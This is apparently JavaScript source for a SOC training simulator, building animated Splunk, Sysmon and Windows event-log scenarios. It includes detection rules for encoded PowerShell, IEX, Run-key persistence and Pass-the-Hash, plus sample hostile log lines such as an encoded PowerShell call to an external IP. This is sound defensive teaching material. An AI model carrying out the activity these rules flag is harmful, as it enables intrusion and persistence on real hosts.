        `$ # Goal: build familiarity with the tool, with documentation support`,
        '$ man ' + name.toLowerCase().replace(/[^a-z0-9]+/g, '-'),
        '[doc] SYNOPSIS — overview, basic flags, example invocations',
        '$ # Step 1: verify version & connectivity',
        `$ ${name.toLowerCase().replace(/[^a-z0-9]+/g, '-')} --version`,
        '[ok] version 1.0.2 installed — matches team baseline',
        '$ # Step 2: dry-run against a safe target',
        `$ ${name.toLowerCase().replace(/[^a-z0-9]+/g, '-')} --dry-run`,
        '[ok] no side effects — 3 steps planned',
        '$ # Step 3: walk through each step, reading docs as needed',
        '$ # → ready to progress to intermediate workflows'
      ];
    }
    if (l === 'intermediate') {
      return [
        `$ # ${name} — daily workflow @ ${t}`,
        `$ # ${lvlLine(l, 'open')} — ${lvlLine(l, 'close')}`,
        '$ TARGET=192.168.56.103',
        `$ ${name.toLowerCase().replace(/[^a-z0-9]+/g, '-')} inspect $TARGET`,
        '[*] inspecting target...',
        '[ok] reachable | latency 4.2ms | fingerprint: linux 5.x',
        '$ # Run standard checks',
        `[ok] config_baseline     PASS`,
        `[ok] auth_mechanism       PASS`,
        `[warn] tls_version        TLSv1.2 (consider TLSv1.3)`,
        `[ok] log_level            PASS`,
        `[warn] default_credentials  review recommended`,
        '$ # Investigate warning',
        `[ok] trace → /etc/default/cfg`,
        '[ok] finding logged to /tmp/findings.log',
        '$ # Workflow complete — 2 warnings, 0 critical'
      ];
    }
    if (l === 'advanced') {
      return [
        `$ # ${name} — advanced investigation @ ${t}`,
        `$ # ${lvlLine(l, 'open')} — ${lvlLine(l, 'close')}`,
        `$ ${name.toLowerCase().replace(/[^a-z0-9]+/g, '-')} --batch --target 192.168.56.0/24`,
        '[*] mapping target range (256 addresses)...',
        '[+] 12 hosts up | 4 listening on the relevant port',
        '$ # Deep inspection of the 4 candidates',
        `$ ${name.toLowerCase().replace(/[^a-z0-9]+/g, '-')} probe --deep --targets 192.168.56.103,110,115,121`,
        '[!] 192.168.56.103 — anomalous response pattern detected',
        '[!] 192.168.56.110 — unexpected service on port 7547',
        '$ # Correlate with logs',
        `[+] 47 matching events in the last 24h`,
        '[!] beacon pattern every 60.0s — likely C2 channel',
        '$ # Capture evidence',
        `[ok] /tmp/evidence.pcap saved (47 KB) | sha256=4f8c...e201`,
        '$ # Generate findings report',
        '[ok]   - 1 CRITICAL: C2 beacon on .103:443',
        '[ok]   - 1 HIGH:     unexpected service on .110:7547',
        '[ok]   - 2 MEDIUM:   TLS misconfig, weak ciphers',
        '$ # Recommended remediation:',
        '$ #   1. Isolate 192.168.56.103 from the LAN',
        '$ #   2. Block outbound 443 to attacker IP at perimeter',
        '$ #   3. Reset credentials on affected host',
        '$ #   4. Re-image + re-deploy with hardened baseline'
      ];
    }
    // expert
    return [
      `$ # ${name} — expert scenario @ ${t}`,
      `$ # ${lvlLine(l, 'open')} — ${lvlLine(l, 'close')}`,
      `$ ${name.toLowerCase().replace(/[^a-z0-9]+/g, '-')} --audit --strict --target enterprise-lab`,
      '[*] running 247 audit controls across 18 systems...',
      '[ok] 184 PASS | 38 WARN | 21 FAIL | 4 UNKNOWN',
      '$ # Triage the 21 failures',
      `[!] Access Control (AC):    7 failures`,
      `[!] Audit & Accountability: 5 failures`,
      `[!] Configuration Mgmt:     6 failures`,
      `[!] Identification & Auth:  3 failures`,
      '$ # Root-cause analysis on the AC cluster',
      `[!] shared root cause: orphaned accounts from 2 legacy services`,
      '[!] recommendation: implement automated deprovisioning via SCIM',
      '$ # Architect the fix',
      '[ok] remediation plan:',
      '[ok]   - Phase 1: integrate SCIM provider (2 sprints)',
      '[ok]   - Phase 2: dry-run reconciliation (1 sprint)',
      '[ok]   - Phase 3: cutover + monitor (2 sprints)',
      `$ # Document the new team standard for ${name}`,
      '[ok] standard drafted — submit for peer review',
      '$ # Mentor note: walk 2 engineers through this scenario next week'
    ];
  }


/* ============================================================
 *  BATCH A — SIEM & DETECTION (10 skills)
 *  Each builder produces a UNIQUE visual + animation + terminal
 *  Builder signature: (skill, meta, lvl) => { intro, visual, lines, animate }
 *  All timers go through `timers.later()` / `timers.every()` (auto-cleanup)
 *  All element IDs use the slug prefix (skill.name → kebab-case)
 * ============================================================ */

/* ----- 1. Splunk SPL — Intermediate
 * Visual: Splunk Search Head UI — search bar (typing real SPL PTH-hunt query)
 *         + time picker + 3-column results table populating row-by-row
 *         + KPI strip (NTLM evts/min, distinct src, admin-target hits, search time)
 * Animation: type SPL → dispatching → scanning KPIs rise → results table fills
 */
function buildSplunkSPLSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const splQuery =
    'index=win_hosts sourcetype=WinEventLog:Security (EventCode=4624 LogonType=3 AuthenticationPackage=NTLM) ' +
    'OR (EventCode=4688 NewProcessName=*lsass.exe) | stats count by src_ip, target_user | where count > 5';

  const results = [
    { ip: '10.0.0.42',         user: 'svc_backup',   c: 17, sev: 'crit' },
    { ip: '10.0.0.99',         user: 'administrator',c: 14, sev: 'crit' },
    { ip: '192.168.56.103',    user: 'jdoe',          c:  9, sev: 'warn' },
    { ip: '10.0.0.5',          user: 'admin',         c:  8, sev: 'warn' },
    { ip: '10.0.0.7',          user: 'helpdesk1',     c:  7, sev: 'info' }
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Intermediate</strong> — ${escapeHtmlS(meta.role)}.
    Scenario: ${escapeHtmlS(meta.scene)}. Pass-the-Hash hunt across the WinEventLog:Security feed using a real SPL
    search head — LogonType=3 + NTLM, correlated with potential <span class="code-inline">lsass.exe</span> process spawns.
    IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="spl-search-head" id="${slug}-head">
      <div class="spl-search-bar">
        <span class="spl-search-ico">🔍</span>
        <span class="spl-search-text" id="${slug}-q"></span><span class="spl-search-caret" id="${slug}-caret">▍</span>
      </div>
      <div class="spl-time-picker">⏱ Last 60 min ▾</div>
      <button class="spl-search-btn">▶ Search</button>
      <span class="spl-search-meta" id="${slug}-meta">0 events · 0.00s</span>
    </div>
    <div class="spl-results-wrap">
      <div class="spl-results-head">
        <span>src_ip</span><span>target_user</span><span class="num">count</span>
      </div>
      <div class="spl-results-body" id="${slug}-results"></div>
    </div>
    <div class="siem-kpis" style="margin-top:10px">
      <div class="siem-kpi"><div class="siem-kpi-val" id="${slug}-k-ntlm">0</div><div class="siem-kpi-lbl">NTLM evts/min</div></div>
      <div class="siem-kpi"><div class="siem-kpi-val" id="${slug}-k-src">0</div><div class="siem-kpi-lbl">distinct src</div></div>
      <div class="siem-kpi alert"><div class="siem-kpi-val" id="${slug}-k-adm">0</div><div class="siem-kpi-lbl">admin-target</div></div>
      <div class="siem-kpi"><div class="siem-kpi-val" id="${slug}-k-resp">0.0s</div><div class="siem-kpi-lbl">search time</div></div>
    </div>
  `;

  const lines = [
    `$ splunk search — daily workflow @ ${ts()}`,
    `$ # hunt Pass-the-Hash across the fleet (intermediate-level autonomy)`,
    `$ | ${splQuery}`,
    '[*] dispatching search to 3 indexer peers (cluster: win_idx)...',
    '[ok] idx=win_hosts · sourcetype=WinEventLog:Security · 1,213,847 evts in window',
    '[*] (EventCode=4624 AND LogonType=3 AND AuthenticationPackage=NTLM) → 1,847 hits',
    '[*] OR (EventCode=4688 NewProcessName=*lsass.exe) → 0 hits (no PTH spawn)',
    '[*] stats count by src_ip, target_user → 23 buckets',
    '[*] where count > 5 → 5 buckets retained',
    '[ok] search complete in 2.81s · 5 results returned',
    '[!] top hit: 10.0.0.42 → svc_backup (17 NTLM logons in 60 min)',
    '[!] 10.0.0.99 → administrator (14 hits) — admin-target escalation',
    '$ # pivot to per-host timeline:',
    '$ | sort 0 -count | head 5 | fields src_ip target_user count',
    '$ # → create alert: trigger when count > 12 for admin targets'
  ];

  function animate(host, timers) {
    const q       = host.querySelector('#' + slug + '-q');
    const caret   = host.querySelector('#' + slug + '-caret');
    const metaEl  = host.querySelector('#' + slug + '-meta');
    const resEl   = host.querySelector('#' + slug + '-results');
    const ntlm    = host.querySelector('#' + slug + '-k-ntlm');
    const src     = host.querySelector('#' + slug + '-k-src');
    const adm     = host.querySelector('#' + slug + '-k-adm');
    const resp    = host.querySelector('#' + slug + '-k-resp');

    // idempotent reset
    if (q) q.textContent = '';
    if (resEl) resEl.innerHTML = '';
    if (metaEl) metaEl.textContent = '0 events · 0.00s';
    [ntlm, src, adm].forEach(e => { if (e) e.textContent = '0'; });
    if (resp) resp.textContent = '0.0s';
    if (caret) caret.style.display = '';

    // Phase 1: type the SPL query character-by-character
    let i = 0;
    timers.every(() => {
      if (i >= splQuery.length) return;
      i++;
      if (q) q.textContent = splQuery.slice(0, i);
    }, 22);
    const typingMs = splQuery.length * 22 + 280;

    // Phase 2: caret disappears, search dispatch starts, KPIs ramp up
    timers.later(() => {
      if (caret) caret.style.display = 'none';
      if (metaEl) metaEl.textContent = 'scanning 1.2M evts...';
      let n = 0;
      timers.every(() => {
        n++;
        if (ntlm) ntlm.textContent = Math.min(1847, Math.floor(n * 210)).toString();
        if (src)  src.textContent  = Math.min(23,   Math.floor(n * 2.6)).toString();
        if (adm)  adm.textContent  = Math.min(2,    Math.floor(n * 0.22)).toString();
        if (metaEl) metaEl.textContent = (n * 2200) + ' events scanned · ' + (n * 0.31).toFixed(2) + 's';
      }, 90);

      // Phase 3: results table populates row-by-row
      timers.later(() => {
        let ri = 0;
        timers.every(() => {
          if (ri >= results.length) return;
          const r = results[ri++];
          if (!resEl) return;
          const row = document.createElement('div');
          row.className = 'spl-results-row ' + r.sev;
          row.innerHTML = '<span>' + r.ip + '</span><span>' + r.user + '</span><span class="num">' + r.c + '</span>';
          resEl.appendChild(row);
        }, 260);
      }, 1500);

      // Phase 4: final state — search time lands
      timers.later(() => {
        if (resp)   resp.textContent   = '2.8s';
        if (metaEl) metaEl.textContent = '5 results · 2.81s';
      }, 3200);
    }, typingMs);
  }

  return { intro, visual, lines, animate };
}

/* ----- 2. Splunk CIM — Beginner
 * Visual: CIM Data Model audit view — sourcetypes list (left), data-model tag
 *         tree (right), props.conf editor below.
 * Animation: highlight untagged sourcetype → walk tag tree → write props.conf
 *            stanzas → verify Authentication tag now enabled.
 */
function buildSplunkCIMSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const sourcetypes = [
    { name: 'WinEventLog:Security',  tag: '—',            status: 'untagged' },
    { name: 'WinEventLog:System',     tag: 'endpoint',     status: 'tagged' },
    { name: 'WinEventLog:Application',tag: '—',            status: 'ok' },
    { name: 'linux:syslog',           tag: 'endpoint',     status: 'tagged' },
    { name: 'cisco:ios',              tag: 'network',      status: 'tagged' }
  ];
  const tagTree = ['Authentication', 'Endpoint', 'Network', 'Web', 'Email', 'Performance'];
  const propsLines = [
    '[source::WinEventLog:Security]',
    'EVENTTYPE1 = windows_security',
    'KV_MODE = xml',
    'SHOULD_LINEMERGE = false',
    'LINE_BREAKER = ([\\r\\n]+)',
    'TZ = UTC',
    '',
    '[eventtype=windows_security]',
    'TAG.Authentication = enabled',
    'TAG.Endpoint = enabled'
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Beginner</strong> — ${escapeHtmlS(meta.role)}.
    Guided walkthrough: ${escapeHtmlS(meta.scene)}. We audit sourcetypes and tag
    <span class="code-inline">WinEventLog:Security</span> with the Authentication data model by writing real
    <span class="code-inline">props.conf</span> stanzas. IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="cim-audit-grid">
      <div class="cim-sourcetypes siem-panel">
        <div class="siem-head"><span>// SOURCETYPES</span><span>audit</span></div>
        <div class="cim-st-list" id="${slug}-st">
          ${sourcetypes.map((s, i) => `
            <div class="cim-st-row ${s.status}" data-i="${i}">
              <span class="cim-st-led"></span>
              <span class="cim-st-name">${s.name}</span>
              <span class="cim-st-tag" id="${slug}-tag-${i}">${s.tag}</span>
            </div>
          `).join('')}
        </div>
      </div>
      <div class="cim-tagtree siem-panel">
        <div class="siem-head"><span>// CIM DATA MODEL TAGS</span><span>Authentication</span></div>
        <div class="cim-tt-list" id="${slug}-tt">
          ${tagTree.map((t, i) => `
            <div class="cim-tt-row" data-i="${i}">
              <span class="cim-tt-chk" id="${slug}-chk-${i}">○</span>
              <span class="cim-tt-name">${t}</span>
              <span class="cim-tt-state" id="${slug}-tts-${i}">untagged</span>
            </div>
          `).join('')}
        </div>
      </div>
    </div>
    <div class="script-editor" style="margin-top:10px">
      <div class="sim-h">// props.conf editor (local)</div>
      <pre class="code-viewer" id="${slug}-props" style="max-height:180px"></pre>
    </div>
  `;

  const lines = [
    `$ # Splunk CIM — guided walkthrough @ ${ts()}`,
    '$ # Goal: normalize WinEventLog:Security into the CIM Authentication model',
    '$ man splunk-cim',
    '[doc] CIM = Common Information Model, 14 data models (Authentication, Endpoint, ...)',
    '$ # Step 1: audit current sourcetypes & their tags',
    '$ splunk btool props list --source WinEventLog:Security',
    '[ok] 5 sourcetypes audited — 1 untagged (WinEventLog:Security)',
    '[warn] WinEventLog:Security has no Authentication tag → missing CIM coverage',
    '$ # Step 2: create EVENTTYPE for 4624 events',
    '$ vim /opt/splunk/etc/system/local/eventtypes.conf',
    '[win_security_auth]',
    'search = (sourcetype=WinEventLog:Security EventCode=4624)',
    '$ # Step 3: add tags to props.conf under the eventtype stanza',
    '$ vim /opt/splunk/etc/system/local/props.conf',
    '[eventtype=windows_security]',
    'TAG.Authentication = enabled',
    'TAG.Endpoint = enabled',
    '$ # Step 4: reload & verify',
    '$ splunk reload tags && splunk audit cim --sourcetype WinEventLog:Security',
    '[ok] tag Authentication = enabled',
    '[ok] CIM coverage restored — ES detections can now match on Authentication model'
  ];

  function animate(host, timers) {
    const propsEl = host.querySelector('#' + slug + '-props');
    const stRows  = host.querySelectorAll('#' + slug + '-st .cim-st-row');
    const chk0    = host.querySelector('#' + slug + '-chk-0');
    const tts0    = host.querySelector('#' + slug + '-tts-0');
    const tag0    = host.querySelector('#' + slug + '-tag-0');

    // idempotent reset
    if (propsEl) propsEl.textContent = '';
    stRows.forEach(r => r.classList.remove('active', 'done'));
    if (chk0) { chk0.textContent = '○'; chk0.classList.remove('on'); }
    if (tts0) tts0.textContent = 'untagged';
    if (tag0) tag0.textContent = '—';

    // Phase 1: highlight the untagged sourcetype row (audit pending)
    timers.later(() => { if (stRows[0]) stRows[0].classList.add('active'); }, 400);

    // Phase 2: walk tag tree — begin tagging Authentication row
    timers.later(() => {
      if (chk0) { chk0.textContent = '◉'; chk0.classList.add('on'); }
      if (tts0) tts0.textContent = 'tagging...';
    }, 1700);

    // Phase 3: type out props.conf stanzas line-by-line
    let pi = 0;
    timers.later(() => {
      timers.every(() => {
        if (pi >= propsLines.length) return;
        const ln = propsLines[pi++];
        if (propsEl) {
          propsEl.textContent += ln + '\n';
          propsEl.scrollTop = propsEl.scrollHeight;
        }
      }, 240);
    }, 2200);

    // Phase 4: verify tag — mark done
    timers.later(() => {
      if (tts0) tts0.textContent = 'tagged ✓';
      if (chk0) chk0.classList.add('done');
      if (stRows[0]) { stRows[0].classList.remove('active'); stRows[0].classList.add('done'); }
      if (tag0) tag0.textContent = 'authentication ✓';
    }, 5200);
  }

  return { intro, visual, lines, animate };
}

/* ----- 3. Splunk Alerts/Dashboards — Intermediate
 * Visual: dashboard.xml (SimpleXML) editor at the top, 4-panel dashboard grid
 *         below: (1) Top 5 MITRE tactics horizontal bar chart, (2) alerts by
 *         severity donut, (3) MTTR 14-day sparkline, (4) tuning ratio gauge.
 * Animation: XML typed out → panels render sequentially, each with its own
 *            internal animation (bars grow, donut segments fill, sparkline
 *            rises, needle swings).
 */
function buildSplunkAlertsDashboardsSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const xmlSnippet =
    '<dashboard script="soc_kpi.js" stylesheet="soc_kpi.css">\n' +
    '  <label>SOC KPI Dashboard v1.2</label>\n' +
    '  <row>\n' +
    '    <panel>\n' +
    '      <title>Top 5 MITRE Tactics (7d)</title>\n' +
    '      <chart><search>\n' +
    '        <query>index=alerts | stats count by mitre_tactic\n' +
    '               | sort 5 -count</query>\n' +
    '      </search>\n' +
    '      <option name="charting.chart">bar</option>\n' +
    '      </chart>\n' +
    '    </panel>\n' +
    '  </row>\n' +
    '</dashboard>';

  const tactics = [
    { name: 'DefenseEvasion', pct: 92 },
    { name: 'Execution',      pct: 74 },
    { name: 'Persistence',    pct: 61 },
    { name: 'Discovery',     pct: 47 },
    { name: 'CredAccess',     pct: 33 }
  ];
  const sevData = [['crit', 23], ['high', 41], ['med', 24], ['low', 12]];
  const sparkHeights = [85, 78, 72, 80, 68, 60, 55, 62, 58, 50, 47, 42, 38, 35];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Intermediate</strong> — ${escapeHtmlS(meta.role)}.
    Scenario: ${escapeHtmlS(meta.scene)}. A real <span class="code-inline">&lt;dashboard&gt;</span> SimpleXML definition is
    typed out panel-by-panel, and 4 visualizations render sequentially: MITRE tactic bar chart, severity donut,
    MTTR trend sparkline, and tuning-ratio gauge. IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="dash-builder">
      <div class="dash-xml-wrap script-editor" style="margin-bottom:10px">
        <div class="sim-h">// dashboard.xml (SimpleXML source)</div>
        <pre class="code-viewer" id="${slug}-xml" style="max-height:140px"></pre>
      </div>
      <div class="dash-panels" id="${slug}-panels">
        <div class="dash-panel" data-i="0">
          <div class="dash-panel-title">Top 5 MITRE Tactics</div>
          <div class="dash-bar-chart">
            ${tactics.map((t, i) => `
              <div class="dash-bar-row">
                <span class="dash-bar-lbl">${t.name}</span>
                <span class="dash-bar-track"><span class="dash-bar-fill" id="${slug}-bar-${i}" style="width:0%"></span></span>
                <span class="dash-bar-val" id="${slug}-barv-${i}">0</span>
              </div>
            `).join('')}
          </div>
        </div>
        <div class="dash-panel" data-i="1">
          <div class="dash-panel-title">Alerts by Severity</div>
          <div class="dash-donut">
            <div class="dash-donut-ring">
              ${sevData.map((d) => `<span class="dash-donut-seg ${d[0]}" id="${slug}-seg-${d[0]}" style="--p:0%"></span>`).join('')}
            </div>
            <div class="dash-donut-center" id="${slug}-donut-total">0</div>
          </div>
          <div class="dash-donut-legend">
            ${sevData.map((d) => `<span><i class="leg ${d[0]}"></i>${d[0].toUpperCase()} <b id="${slug}-lv-${d[0]}">0</b></span>`).join('')}
          </div>
        </div>
        <div class="dash-panel" data-i="2">
          <div class="dash-panel-title">MTTR Trend (14d)</div>
          <div class="dash-spark">
            ${sparkHeights.map((_, i) => `<span class="dash-spark-bar" id="${slug}-sp-${i}" style="height:0%"></span>`).join('')}
          </div>
          <div class="dash-spark-axis">14d ago → today</div>
        </div>
        <div class="dash-panel" data-i="3">
          <div class="dash-panel-title">Tuning Ratio (Last 7d)</div>
          <div class="dash-tune">
            <div class="dash-tune-gauge"><span class="dash-tune-needle" id="${slug}-tune-needle" style="transform:rotate(-90deg)"></span></div>
            <div class="dash-tune-num">
              <span class="dash-tune-val" id="${slug}-tune-val">0%</span>
              <span class="dash-tune-lbl">tuned of 1,000 alerts</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;

  const lines = [
    `$ splunk dashboards — daily SOC Lead workflow @ ${ts()}`,
    '$ # build a 4-panel dashboard for management review',
    '$ vim $SPLUNK_HOME/etc/apps/soc_kpi/default/data/ui/views/soc_kpi.xml',
    '$ # panel 1: Top 5 MITRE tactics by event count',
    '[ok] saved → panel 1 (bar chart)',
    '$ # panel 2: alerts by severity donut',
    '[ok] saved → panel 2 (donut)',
    '$ # panel 3: MTTR 14-day trend (line chart)',
    '[ok] saved → panel 3 (line)',
    '$ # panel 4: tuning ratio gauge (tuned vs total alerts)',
    '[ok] saved → panel 4 (gauge)',
    '$ splunk reload dashboards',
    '[ok] soc_kpi dashboard v1.2 deployed — visible to SOC analysts',
    '$ # share URL: /app/soc_kpi/soc_kpi',
    '$ # next: schedule PDF delivery to SOC-LEADS@corp distro, Mondays 09:00'
  ];

  function animate(host, timers) {
    const xmlEl  = host.querySelector('#' + slug + '-xml');
    const panels = host.querySelectorAll('#' + slug + '-panels .dash-panel');

    // idempotent reset
    if (xmlEl) xmlEl.textContent = '';
    panels.forEach(p => p.classList.remove('rendered'));
    for (let i = 0; i < 5; i++) {
      const bar = host.querySelector('#' + slug + '-bar-' + i);
      const val = host.querySelector('#' + slug + '-barv-' + i);
      if (bar) bar.style.width = '0%';
      if (val) val.textContent = '0';
    }
    sevData.forEach((d) => {
      const seg = host.querySelector('#' + slug + '-seg-' + d[0]);
      const lv  = host.querySelector('#' + slug + '-lv-' + d[0]);
      if (seg) seg.style.setProperty('--p', '0%');
      if (lv)  lv.textContent = '0';
    });
    const donutTotal = host.querySelector('#' + slug + '-donut-total');
    if (donutTotal) donutTotal.textContent = '0';
    for (let i = 0; i < 14; i++) {
      const sp = host.querySelector('#' + slug + '-sp-' + i);
      if (sp) sp.style.height = '0%';
    }
    const tuneVal = host.querySelector('#' + slug + '-tune-val');
    const tuneNd  = host.querySelector('#' + slug + '-tune-needle');
    if (tuneVal) tuneVal.textContent = '0%';
    if (tuneNd)  tuneNd.style.transform = 'rotate(-90deg)';

    // Phase 1: type out the SimpleXML
    let xi = 0;
    timers.every(() => {
      if (xi >= xmlSnippet.length) return;
      xi++;
      if (xmlEl) xmlEl.textContent = xmlSnippet.slice(0, xi);
    }, 14);
    const xmlMs = xmlSnippet.length * 14 + 250;

    // Phase 2: bar chart renders
    timers.later(() => {
      if (panels[0]) panels[0].classList.add('rendered');
      tactics.forEach((t, i) => {
        timers.later(() => {
          const bar = host.querySelector('#' + slug + '-bar-' + i);
          const val = host.querySelector('#' + slug + '-barv-' + i);
          if (bar) bar.style.width = t.pct + '%';
          if (val) val.textContent = t.pct;
        }, i * 170);
      });
    }, xmlMs);

    // Phase 3: donut renders
    timers.later(() => {
      if (panels[1]) panels[1].classList.add('rendered');
      let sum = 0;
      sevData.forEach((d, i) => {
        timers.later(() => {
          const seg = host.querySelector('#' + slug + '-seg-' + d[0]);
          const lv  = host.querySelector('#' + slug + '-lv-' + d[0]);
          if (seg) seg.style.setProperty('--p', d[1] + '%');
          if (lv)  lv.textContent = d[1];
          sum += d[1];
          const tot = host.querySelector('#' + slug + '-donut-total');
          if (tot) tot.textContent = sum;
        }, i * 190);
      });
    }, xmlMs + 1100);

    // Phase 4: sparkline renders
    timers.later(() => {
      if (panels[2]) panels[2].classList.add('rendered');
      sparkHeights.forEach((h, i) => {
        timers.later(() => {
          const sp = host.querySelector('#' + slug + '-sp-' + i);
          if (sp) sp.style.height = h + '%';
        }, i * 90);
      });
    }, xmlMs + 2300);

    // Phase 5: tuning gauge swings
    timers.later(() => {
      if (panels[3]) panels[3].classList.add('rendered');
      let p = 0;
      timers.every(() => {
        if (p >= 78) return;
        p = Math.min(78, p + 4);
        const v  = host.querySelector('#' + slug + '-tune-val');
        const nd = host.querySelector('#' + slug + '-tune-needle');
        if (v)  v.textContent = p + '%';
        if (nd) nd.style.transform = 'rotate(' + (-90 + p * 1.8) + 'deg)';
      }, 80);
    }, xmlMs + 3500);
  }

  return { intro, visual, lines, animate };
}

/* ----- 4. Sysmon — Intermediate
 * Visual: 2-col grid — left: Sysmon config XML editor showing real <RuleGroup>
 *         with <ProcessCreate onmatch="include"> etc. Right: live Sysmon event
 *         stream (Event ID 1, 3, 13). One `powershell.exe -enc` event
 *         highlighted red.
 * Animation: install Sysmon → load config → events stream → -enc event flagged
 */
function buildSysmonSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const sysmonConfig = [
    '<Sysmon schemaversion="4.95">',
    '  <HashAlgorithms>SHA256</HashAlgorithms>',
    '  <EventFiltering>',
    '    <RuleGroup name="ProcessCreate" groupRelation="or">',
    '      <ProcessCreate onmatch="include">',
    '        <CommandLine condition="contains">-enc</CommandLine>',
    '        <CommandLine condition="contains">IEX</CommandLine>',
    '        <Image condition="is">powershell.exe</Image>',
    '      </ProcessCreate>',
    '    </RuleGroup>',
    '    <RuleGroup name="Network" groupRelation="or">',
    '      <NetworkConnect onmatch="include">',
    '        <DestinationPort>443</DestinationPort>',
    '        <DestinationPort>80</DestinationPort>',
    '      </NetworkConnect>',
    '    </RuleGroup>',
    '    <RuleGroup name="Registry" groupRelation="or">',
    '      <RegistryEvent onmatch="include">',
    '        <TargetObject condition="contains">\\\\Run\\\\</TargetObject>',
    '      </RegistryEvent>',
    '    </RuleGroup>',
    '  </EventFiltering>',
    '</Sysmon>'
  ].join('\n');

  const events = [
    { id: 1, txt: 'powershell.exe -NoProfile -enc SQBFAFgA...',         sev: 'crit' },
    { id: 1, txt: 'chrome.exe https://corp.local/dashboard',             sev: 'ok'   },
    { id: 3, txt: 'chrome.exe → 140.82.121.4:443',                       sev: 'info' },
    { id: 13, txt: 'HKCU\\...\\Run\\Updater = "C:\\updater.exe"',         sev: 'warn' },
    { id: 1, txt: 'svchost.exe -k netsvcs',                              sev: 'ok'   },
    { id: 3, txt: 'powershell.exe → 185.220.101.42:443',                 sev: 'crit' },
    { id: 1, txt: 'cmd.exe /c whoami /groups',                           sev: 'warn' }
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Intermediate</strong> — ${escapeHtmlS(meta.role)}.
    Scenario: ${escapeHtmlS(meta.scene)}. Deploy Sysmon v15 with a tuned config (ProcessCreate on
    <span class="code-inline">-enc</span> + <span class="code-inline">IEX</span>) and watch a live event
    stream — a <span class="code-inline">powershell.exe -enc</span> process creation fires and is flagged red.
    IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="script-grid" id="${slug}-grid">
      <div class="script-editor">
        <div class="sim-h">// sysmon-config.xml</div>
        <pre class="code-viewer" id="${slug}-cfg" style="max-height:260px"></pre>
      </div>
      <div class="script-exec siem-panel" style="padding:10px">
        <div class="siem-head"><span>// SYSMON EVENT STREAM</span><span id="${slug}-status">idle</span></div>
        <div class="siem-log-stream" id="${slug}-stream" style="height:230px"></div>
      </div>
    </div>
  `;

  const lines = [
    `$ sysmon — daily Detection Engineer workflow @ ${ts()}`,
    '$ # deploy Sysmon v15 with team-curated config to DC01 (intermediate-level autonomy)',
    '$ sysmon-15.0.exe -accepteula -i sysmon-config.xml',
    '[ok] Sysmon installed (sysmon64.exe v15.0.0.0) — service running',
    '[ok] config loaded: 3 RuleGroups active (ProcessCreate, Network, Registry)',
    '[ok] EventLog Microsoft-Windows-Sysmon/Operational enabled',
    '$ # forwarder picks up the new channel:',
    '$ splunk add monitor "Microsoft-Windows-Sysmon/Operational" --index win_sysmon',
    '[ok] UF sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon',
    '$ # observe the live stream:',
    '$ tail -f /var/log/splunk/sysmon-events.log',
    '[*] EID=1 Image=chrome.exe Parent=explorer.exe',
    '[*] EID=3 Image=chrome.exe Dst=140.82.121.4:443',
    '[!] EID=1 Image=powershell.exe CmdLine=-NoProfile -enc SQBFAFgA... → SUSPICIOUS',
    '[ok] alert win_sysmon_powershell_enc fired → SOC ticket created'
  ];

  function animate(host, timers) {
    const cfgEl    = host.querySelector('#' + slug + '-cfg');
    const streamEl = host.querySelector('#' + slug + '-stream');
    const statusEl = host.querySelector('#' + slug + '-status');

    // idempotent reset
    if (cfgEl) cfgEl.textContent = '';
    if (streamEl) streamEl.innerHTML = '';
    if (statusEl) statusEl.textContent = 'installing...';

    // Phase 1: type out the Sysmon config XML (escaped for display)
    let i = 0;
    const escConfig = sysmonConfig.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    timers.every(() => {
      if (i >= escConfig.length) return;
      i++;
      if (cfgEl) cfgEl.textContent = sysmonConfig.slice(0, i);
      if (cfgEl) cfgEl.scrollTop = cfgEl.scrollHeight;
    }, 8);
    const cfgMs = escConfig.length * 8 + 300;

    // Phase 2: Sysmon installed — status flips to active, events stream in
    timers.later(() => {
      if (statusEl) statusEl.textContent = 'running';
      let ei = 0;
      timers.every(() => {
        if (ei >= events.length) return;
        const e = events[ei++];
        if (!streamEl) return;
        const line = document.createElement('span');
        line.className = 'siem-log-line ' + e.sev;
        line.textContent = `${ts()} EID=${e.id}  ${e.txt}`;
        streamEl.appendChild(line);
        // keep last ~10 lines visible
        while (streamEl.children.length > 10) streamEl.removeChild(streamEl.firstChild);
        if (e.sev === 'crit' && statusEl) statusEl.textContent = '⚠ alert fired';
      }, 720);
    }, cfgMs);
  }

  return { intro, visual, lines, animate };
}

/* ----- 5. Windows Event Logs — Intermediate
 * Visual: Windows Event Viewer-style UI — categories sidebar (left, narrow),
 *         color-coded event stream (right). Each event row colored by EventID
 *         (4624=blue/info, 4688=green/ok, 4698=amber/warn). One LogonType=3
 *         from a non-domain host flagged suspicious (red).
 * Animation: events stream in type-by-type → suspicious LogonType=3 highlighted
 */
function buildWindowsEventLogsSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const categories = [
    { name: 'Application',     count: 0, key: 'app' },
    { name: 'Security',       count: 0, key: 'sec' },
    { name: 'Setup',          count: 0, key: 'setup' },
    { name: 'System',         count: 0, key: 'sys' },
    { name: 'ForwardedEvents',count: 0, key: 'fwd' }
  ];
  const events = [
    { id: 4624, txt: 'Logon  User=jdoe         Src=WKS-07         LogonType=2  (Interactive)',     sev: 'ev-4624' },
